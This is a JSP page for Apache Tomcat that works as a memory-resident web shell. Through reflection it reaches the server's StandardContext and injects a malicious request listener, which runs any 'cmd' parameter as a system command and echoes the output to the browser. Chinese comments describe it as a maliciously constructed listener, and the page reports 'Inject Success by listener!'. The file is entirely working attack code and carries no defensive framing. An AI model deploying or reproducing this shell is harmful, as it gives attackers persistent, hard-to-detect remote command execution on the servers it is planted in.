<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class ServletListener implements ServletRequestListener {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            try {
                String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");
                //获取到 Response 对象,用于命令回显输出
                org.apache.catalina.connector.RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
                requestField.setAccessible(true);
                Request request = (Request) servletRequestEvent.getServletRequest();
                Response response = (Response) request.getResponse();

                //命令执行并通过 Response 对象进行输出结果到浏览器中
                if (cmd != null){
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    int i = 0;
                    byte[] bytes = new byte[1024];
                    while ((i = inputStream.read(bytes)) != -1){
                        response.getWriter().write(new String(bytes,0,i));
                        response.getWriter().write("\r\n");
                    }
                }
            }catch (Exception e){
                e.printStackTrace();
            }

        }
    }
%>


<%
    //获取到 StandardContext 对象的 applicationEventListenersList 属性,最后把恶意构造的监听器注入到 applicationEventListenersList 属性中
    ServletContext servletContext = request.getServletContext();
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    Object[] applicationEventListeners = standardContext.getApplicationEventListeners();
    List<Object> objects = Arrays.asList(applicationEventListeners);
    ArrayList arrayList = new ArrayList(objects);
    arrayList.add(new ServletListener());
    standardContext.setApplicationEventListeners(arrayList.toArray());
    response.getWriter().write("Inject Success by listener!");
%>